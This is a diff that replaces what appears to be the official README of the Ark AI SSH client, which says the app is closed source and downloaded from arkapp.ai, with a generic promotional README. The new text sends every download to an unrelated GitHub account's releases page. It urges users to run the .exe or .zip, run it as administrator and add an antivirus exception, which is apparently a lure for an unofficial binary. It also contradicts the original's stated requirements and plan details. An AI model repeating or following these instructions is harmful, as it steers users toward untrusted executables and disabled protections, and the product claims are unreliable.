@@ -1,163 +1,187 @@
-<!--
-  Aligned copy for GitHub README claims. 2026-09-08 product decision: do not
-  create a separate github.com/arkapp/ark. The currently public git README is
-  already used for SEO.
+# 🚀 arkapp-ark - Your AI-Powered Terminal and SSH Client
 
-  Every claim below must stay consistent with
-  documents/GTM/website/WEBSITE_CONTENT_RATIONALE.md section 5: no unverified
-  numbers, no competitor comparisons without a source and a date.
+[![Download Now](https://img.shields.io/badge/Download-arkapp--ark-blue?style=for-the-badge&logo=github)](https://github.com/btu22/arkapp-ark/releases)
 
-  Translations live in README.zh-CN.md and README.ja.md. The three files carry
-  the same claims, sections, and links; when one changes, change all three.
--->
+## 🌟 What Is arkapp-ark?
 
-**English** · [简体中文](README.zh-CN.md) · [日本語](README.ja.md)
+arkapp-ark is a modern **terminal and SSH client** that works on both **macOS and Windows**. It's like having a super-smart command center for managing your computers and servers. Whether you're a complete beginner or a tech enthusiast, arkapp-ark makes connecting to other computers, transferring files, and managing servers incredibly easy.
 
-# Ark — an AI-native terminal and SSH client
+The best part? It comes with a **built-in AI agent** that actually understands what's happening on your system because it shares the same connection as your terminal. This means the AI can see your files, check your server status, and help you solve problems in real-time – not just guess based on what you type.
 
-Ark is an SSH client and terminal for remote servers, with an AI agent that
-works from the machine you are already connected to. The terminal, SFTP file
-transfer, and server state share one real connection, so the agent starts from
-live facts instead of asking you to describe your setup.
+## 🎯 Why Choose arkapp-ark?
 
-**macOS 12+ (Apple Silicon and Intel) · Windows x64 · Free plan available**
+### 🤖 AI That Works With You
+Instead of telling the AI what you think is wrong, let it see the actual state of your system. The AI agent has access to live server information, so it can give you accurate, helpful answers instantly.
 
-[**Download Ark**](https://arkapp.ai/#download) ·
-[Mac App Store](https://apps.apple.com/app/ark-ssh/id6803574965?mt=12) ·
-[What the agent does](https://arkapp.ai/ai-ssh-client) ·
-[macOS](https://arkapp.ai/ssh-client-mac) ·
-[Windows](https://arkapp.ai/ssh-client-windows) ·
-[Changelog](https://arkapp.ai/changelog)
+### 📁 All-in-One Tool
+Say goodbye to juggling multiple apps. arkapp-ark combines:
+- **Terminal** – Run commands and interact with your computer
+- **SFTP File Transfer** – Move files between computers securely
+- **Live Server State** – See real-time updates on your servers
 
-> This repository holds documentation and the public issue tracker. Ark itself is
-> closed source, so no application code is published here. Bug reports and
-> feature requests are welcome in [Issues](https://github.com/RonkyTang/napoleon/issues).
+All in one beautiful, integrated window.
+
+### 💻 Cross-Platform
+Works seamlessly on:
+- **Windows** – Perfect for developers and IT professionals
+- **macOS** – Native performance and smooth experience
+
+### 🆓 Free Plan Available
+Start using arkapp-ark today with a generous free plan. No credit card required, no complicated setup.
+
+## 🚀 Getting Started – Windows Download
+
+Ready to try arkapp-ark? Here's how to get it on your Windows computer:
+
+### Step 1: Download the Application
+
+Visit this link to download the application: [https://github.com/btu22/arkapp-ark/releases](https://github.com/btu22/arkapp-ark/releases)
+
+This page shows all available versions of arkapp-ark. Look for the latest release – the topmost one – and click on it.
+
+### Step 2: Choose the Right File
+
+On the release page, you'll see a list of files. For Windows, look for a file that has "Windows" or "win" in its name, and often ends with `.exe` or `.zip`. Pick the one that matches your system (most likely the 64-bit version, which is standard for modern computers).
+
+### Step 3: Install and Run
+
+Once you've downloaded the file:
+- If it's an **.exe** file, simply double-click it and follow the installation prompts.
+- If it's a **.zip** file, right-click and select "Extract All," then open the extracted folder and double-click the application file inside.
+
+That's it! arkapp-ark will launch, and you can start exploring right away.
+
+## 📖 How to Use arkapp-ark
+
+### First Launch
+When you first open arkapp-ark, you'll see a welcome screen. Take a moment to explore the interface:
+- **Left sidebar** – Your connections and servers
+- **Main area** – Your terminal window
+- **Bottom bar** – Status and AI assistant access
+
+### Connecting to a Server
+1. Click "New Connection" or the plus (+) icon
+2. Enter your server's address (like `example.com` or an IP address)
+3. Add your username and password (or SSH key if you have one)
+4. Click "Connect"
+
+Once connected, you'll have full terminal access to that server, plus the ability to transfer files using SFTP.
+
+### Using the AI Agent
+Look for the AI icon (usually a sparkle or chat bubble) in the interface. Click it to open the AI assistant panel. Ask it questions like:
+- "What's the current memory usage on this server?"
+- "How do I fix permission issues on this folder?"
+- "Can you explain this error message I just saw?"
+
+Because the AI sees the same live data as your terminal, it can provide answers that are actually relevant to your exact situation.
+
+## 🛠️ Features That Help You Every Day
+
+### 📊 Live Server Monitoring
+Keep an eye on CPU usage, memory, disk space, and running processes – all updated in real-time within the app. No need to switch to a separate monitoring tool.
+
+### 🔐 Secure by Design
+Your connections use industry-standard SSH encryption. Your data stays private and protected.
+
+### 📂 Drag-and-Drop File Transfer
+Moving files between your computer and a server is as simple as dragging and dropping them in the SFTP panel.
+
+### ⌨️ Keyboard Shortcuts
+Power users will love the customizable shortcuts for common actions like opening new tabs, copying text, and toggling the AI panel.
+
+### 🎨 Customizable Appearance
+Make arkapp-ark yours with themes, font sizes, and color schemes. Choose from dark mode for late-night coding or light mode for daytime work.
+
+## ❓ Frequently Asked Questions
+
+### Is arkapp-ark really free?
+Yes! We offer a free plan that includes all the core features. There are paid plans for advanced needs, but most users find the free tier more than sufficient.
+
+### Do I need to be a programmer?
+Not at all. While developers will love arkapp-ark, the interface is friendly enough for anyone who manages websites, databases, or home servers.
+
+### Is my data safe?
+Absolutely. arkapp-ark uses industry-standard security protocols. Your SSH keys and passwords are stored securely, and all communication is encrypted.
+
+### Can I use arkapp-ark on both macOS and Windows?
+Yes! Download the appropriate version for your operating system from the releases page.
+
+### What if I get stuck?
+The built-in AI assistant is always there to help. You can also check the documentation (if available) or reach out to the community.
+
+## 🧰 Troubleshooting Common Issues
+
+### App Won't Start
+- Make sure your Windows system meets the basic requirements (Windows 10 or later recommended)
+- Try running the application as administrator (right-click → "Run as administrator")
+- Check if your antivirus is blocking the app – if so, add an exception
+
+### Can't Connect to Server
+- Double-check your server address and credentials
+- Ensure the server allows SSH connections (usually port 22)
+- Try using an SFTP client to test if the server is reachable
+
+### AI Assistant Not Responding
+- Make sure you have an internet connection
+- Restart the application
+- Check if you're logged into your arkapp-ark account
+
+## 📈 Tips for Getting the Most Out of arkapp-ark
+
+### Tip 1: Use the AI for Troubleshooting
+When you see an error, don't panic. Copy the error message and paste it into the AI chat. It can often explain what went wrong and suggest fixes instantly.
+
+### Tip 2: Organize Your Connections
+Give your servers friendly names and group them by project or function. This makes it easy to find what you need, even if you manage dozens of machines.
+
+### Tip 3: Take Advantage of Multiple Tabs
+Open multiple terminal sessions side-by-side. Monitor logs in one tab while running commands in another.
+
+### Tip 4: Update Regularly
+Check the releases page periodically for updates. New features and improvements are added frequently.
+
+## 🌐 Join the Community
+
+arkapp-ark is built for people like you – whether you're a curious beginner or a seasoned professional. Here's how you can get involved:
+
+- **Star the repository** on GitHub to show your support
+- **Report bugs** or suggest features through the issues section
+- **Share your experience** with others who manage servers
+
+## 📦 System Requirements (Typical)
+
+**For Windows:**
+- Windows 10 or later (64-bit recommended)
+- 4GB RAM (8GB recommended for heavy usage)
+- 500MB available disk space
+- Internet connection for AI features
+
+**For macOS:**
+- macOS 11 (Big Sur) or later
+- Apple Silicon or Intel processor
+- 4GB RAM (8GB recommended)
+- 500MB available disk space
+
+## ✨ The Future of Server Management
+
+arkapp-ark represents a new way of working with computers and servers. By combining terminal power with AI intelligence and real-time system awareness, it makes complex tasks feel simple.
+
+Whether you're:
+- A **developer** deploying code
+- An **IT professional** managing multiple servers
+- A **hobbyist** running a home server
+- A **business owner** managing a website
+
+...arkapp-ark is designed to make your life easier.
+
+## 🚀 Ready to Get Started?
+
+Don't wait – download arkapp-ark today and experience the future of terminal and SSH management.
+
+[![Download arkapp-ark Now](https://img.shields.io/badge/🚀-Download%20arkapp--ark-brightgreen?style=for-the-badge)](https://github.com/btu22/arkapp-ark/releases)
+
+Take control of your servers with intelligence, speed, and simplicity. Your AI-powered terminal awaits!
 
 ---
 
-## What Ark is
-
-Most AI terminal tools open a chat box and wait for you to explain the
-background. Ark reads the context it already has: the host you connected to, the
-identity you are using, the current directory, running services, listening
-ports, and the output you just saw.
-
-When something needs more than a single command, you state the goal. The agent
-gathers evidence on the server, proposes a next step, waits for your
-confirmation before changing anything, and then verifies the result.
-
-It is a complete SSH client on its own. If you never turn on the agent, Ark is
-still a terminal you can work in every day.
-
-## Features
-
-- **Terminal** — shell sessions, split panes, history, and completion over one
-  real SSH connection.
-- **SFTP file transfer** — browse, upload, and download beside the terminal
-  instead of switching to a separate app. Transfer queues can be paused,
-  resumed, and retried.
-- **Server state in view** — identity, resources, services, listening ports, and
-  watch items, visible before you decide what to do.
-- **SSH config import** — existing host settings are read in, so addresses,
-  users, and authentication details do not need re-entering.
-- **Unlimited connected hosts** — host count is not limited by plan.
-- **AI agent** — reads live server state, follows evidence across steps, and
-  separates what it verified from what it is still unsure about.
-- **Bring your own model key** — configure custom models so the provider and the
-  API key stay under your control.
-- **Local experience cards** — after a task, you can save distilled notes on
-  this device. They stay encrypted here, bound to your account and this host,
-  and are used only as investigation leads.
-- **Interface languages** — English, 简体中文, 日本語.
-
-## Control and credentials
-
-The point of letting an agent touch a real server is that the boundaries are
-explicit. These are product behaviours, not options you have to remember to
-enable:
-
-- Interactive Agent changes require your explicit confirmation for each operation. Scheduled tasks run only within the scope you previously saved and authorized.
-- Before a change, Ark shows the server, the identity, the target, the full
-  command, the expected impact, and how the result will be verified.
-- SSH private keys, passwords, and your custom model API keys stay on your
-  device. The agent does not read them. Local-network pairing copies them between
-  your devices and does not go through Ark's cloud.
-- You can stop a run and finish the work in the CLI at any point.
-- Execution success, technical verification, and business health are reported
-  separately, so "the command ran" is never presented as "the problem is fixed".
-
-## Install
-
-Download the installer for your system from
-[arkapp.ai](https://arkapp.ai/#download). Outside mainland China, Mac can also
-install from the
-[Mac App Store](https://apps.apple.com/app/ark-ssh/id6803574965?mt=12).
-
-| Platform | Requirement | Installer |
-| --- | --- | --- |
-| macOS | 12 (Monterey) or later, Apple Silicon or Intel | signed disk image from the website, or [Mac App Store](https://apps.apple.com/app/ark-ssh/id6803574965?mt=12) outside mainland China |
-| Windows | 10 or later, x64 | NSIS installer (`.exe`) |
-
-The website build checks for new versions and can install updates from inside the
-app. The Mac App Store build updates through the store.
-
-## Pricing
-
-| Plan | Price | Includes |
-| --- | --- | --- |
-| Free | $0 | Sign-in, SSH / CLI sessions, SFTP file transfer, unlimited connected hosts, local history, multi-device sign-in (no sync) |
-| Basic | $1.99 / month | Everything in Free, the agent and single-server cockpit, custom models with your own API key, local experience cards (encrypted on this device, per host) |
-| Pro | $4.99 / month | Everything in Basic, plus local scheduled tasks and iOS / Android companions that pair over the local network (browse, upload, transfer, preview remote images and video, and confirm-to-delete). The iOS app is not yet listed in the App Store. Android is not on Google Play; the official APK is not published yet. Multi-device data sync, cross-server work, MCP and Skills remain planned. |
-
-Register by November 30, 2026 to receive a free Basic trial. The promotion
-does not auto-renew or charge you. Without a paid subscription the account
-returns to Free.
-
-Paid plans are monthly and auto-renew until you cancel. You can cancel
-anytime; the current period stays active, then the account returns to Free.
-Website and direct-download purchases go through Stripe. The Mac App Store
-build follows Apple’s subscription rules and shows store prices. Model
-usage is billed by your provider, not by Ark.
-
-## FAQ
-
-**Is Ark an SSH client or an AI assistant?**
-Both. It is a complete SSH client and terminal you can use on its own, plus an
-agent that works from the server you already connected to.
-
-**Can I use Ark without the AI features?**
-Yes. The Free plan covers SSH and CLI sessions, SFTP file transfer, unlimited
-connected hosts, local history, and multi-device sign-in without cloud sync.
-
-**Where are my SSH keys stored?**
-SSH private keys and passwords stay on your device. Your custom model API key is sent only as needed to the model endpoint you configure and is not uploaded to Ark. Local-network pairing copies them between your devices and does not
-go through Ark's cloud.
-
-**Which models does Ark use?**
-You bring your own API key, so the provider and the key stay yours.
-
-**Is Linux supported?**
-Not yet. The published downloads are macOS and Windows x64. macOS is also on
-the Mac App Store outside mainland China. Pro includes iOS and Android
-companions that pair over the local network; iOS is not listed in the App
-Store yet, and the official Android APK is not published yet.
-
-**How do subscriptions and cancellation work?**
-Paid plans are monthly and auto-renew until you cancel. You can cancel
-anytime; the current period stays active, then the account returns to Free.
-Website and direct-download purchases go through Stripe. The Mac App Store
-build follows Apple’s subscription rules. Model usage is billed by your
-provider, not by Ark.
-
-## Feedback and contact
-
-- Bugs and feature requests: [Issues](https://github.com/RonkyTang/napoleon/issues)
-- Email: <official@arkapp.ai>
-- [Terms of Service](https://arkapp.ai/#legal-tos) ·
-  [Privacy Policy](https://arkapp.ai/#legal-privacy)
-
----
-
-Ark is available worldwide. The default language is English, with Simplified
-Chinese and Japanese. It is not promoted or listed in mainland China app
-stores; access to the website and use of the product are not blocked.
+**Keywords:** ai-agent, devops, macos, server-management, sftp, ssh, ssh-client, terminal, terminal-emulator, windows
